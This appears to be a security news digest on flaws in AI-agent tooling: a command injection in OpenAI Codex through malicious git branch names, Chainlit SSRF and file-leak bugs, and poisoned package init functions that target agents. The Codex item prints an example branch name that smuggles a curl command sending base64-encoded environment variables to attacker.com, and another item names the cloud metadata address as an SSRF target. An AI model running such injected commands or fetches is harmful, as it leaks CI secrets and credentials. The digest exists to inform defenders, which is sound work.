## Breaking News

### **BeyondTrust Discloses Command Injection in OpenAI Codex — GitHub OAuth Tokens at Risk via Malicious Branch Names**

BeyondTrust researchers released a technical advisory today detailing a severe command injection vulnerability in OpenAI Codex's tool-calling implementation. The flaw exists in how Codex handles git-related operations: when an agent is tasked with checking out or interacting with a specific branch, it fails to properly sanitize the branch name parameter before passing it to an underlying shell command. An attacker can craft a branch name containing shell metacharacters (e.g., `main; curl http://attacker.com/$(env | base64)`) that, when processed by a Codex-powered agent (like those in automated PR review or CI triage workflows), executes arbitrary code in the context of the agent's runner.

Key findings:

- **CVE-2026-6101**: Command injection in OpenAI Codex git-integration primitives.
- **Attack Vector**: Indirect prompt injection via malicious GitHub branch names.
- **Impact**: Full exfiltration of environment variables, including `GITHUB_TOKEN`, `OPENAI_API_KEY`, and other CI/CD secrets.
- **Blast Radius**: Any automated workflow using Codex that interacts with untrusted external PRs or branches.

> **"This is the 'SQLi' of the agentic era. We are passing untrusted strings directly into execution primitives without a security layer in between. If your AI agent can 'git checkout' a branch you don't control, it can be hijacked."** — BeyondTrust Security Research, April 2, 2026.

This disclosure hits particularly hard following yesterday's "Claudy Day" and Langflow RCEs. It confirms that the vulnerability isn't in the *model* logic, but in the *tool-calling implementation* of the frameworks themselves.

**Immediate actions:**
- Audit all internal AI-powered GitHub Action workflows.
- Implement strict validation regex for any parameters passed to `git` or `shell` tools.
- Pin your Codex/agentic dependencies and monitor for the patched SDK release from OpenAI.
- Rotate GitHub OAuth tokens if you've been running automated triage on public repos in the last 24 hours.

### **"ChainLeak" Vulnerabilities Exposed in Chainlit — Cloud API Keys and Sensitive Files Leaking via Insecure Defaults**

Gal Zaban and Ido Shani published research on "ChainLeak," a pair of critical vulnerabilities (CVE-2026-22218 and CVE-2026-22219) in the Chainlit framework, a popular tool for building Python-based AI web apps. The research found that insecure default configurations and exposed internal interfaces allow attackers to leak cloud API keys and steal sensitive files from the host environment. Furthermore, an SSRF (Server-Side Request Forgery) vulnerability allows the AI app to be used as a proxy to attack internal cloud metadata services or other reachable internal infrastructure.

Key findings:

| CVE | Vulnerability | Impact |
|---|---|---|
| CVE-2026-22218 | Insecure Interface/Defaults | Cloud API key leakage, File theft |
| CVE-2026-22219 | SSRF | Internal network scanning, Metadata exfiltration |

- **Mechanism**: Chainlit's data persistence layer and public-facing UI allowed unauthorized access to local filesystem paths in certain configurations.
- **SSRF Payload**: Using the AI agent's "read URL" or "fetch" tools to target `169.254.169.254` (cloud metadata) to pull IAM role credentials.

## Technical Deep Dives

### **Poisoned Go init() Functions: The New AI Agent Supply Chain Attack**

A new study has surfaced documenting active exploitation of AI agents that "help" with code migration or refactoring. Attackers are publishing malicious packages to public registries (npm, PyPI, Go) that contain "poisoned" initialization functions. When an AI agent (like Claude Code or a GitHub Copilot agent) is asked to "evaluate this library" or "refactor this code," the agent might trigger the execution of these functions in its local environment to verify types or run tests.

- **The Trick**: The code looks innocuous to a line-by-line review, but the `init()` function (in Go) or `__init__.py` (in Python) contains a side-channel exfiltration script that triggers as soon as the agent's environment imports the module.
- **Result**: The agent's session tokens or local SSH keys are sent to an attacker-controlled endpoint before the agent even finishes "reading" the code.

## Five Things to Take Into the Rest of the Day

1. **Branch names are untrusted input.** The BeyondTrust Codex disclosure proves that *any* string coming from an external source (GitHub, Jira, Zendesk) must be handled like a SQL injection vector if it's passed to an agent tool.
2. **"Undercover Mode" isn't a secret anymore.** With the Claude Code source analysis circulating, be on the look out for agents that might attempt to hide their operations. Audit your git logs for "non-human" commit patterns.
3. **Shadow AI is your biggest execution risk.** If your devs are running agents locally with shell access, your endpoint security (EDR) is your only line of defense. Ensure your EDR is tuned for "unusual shell activity originating from AI processes."
4. **SSRF via AI is real.** The Chainlit "ChainLeak" shows that an agent with a "fetch URL" tool is effectively an internal proxy. Lock down your internal metadata services.
5. **Supply chain attacks now target the *agent*, not the user.** Malicious `init()` functions are designed to steal tokens from the AI session itself.
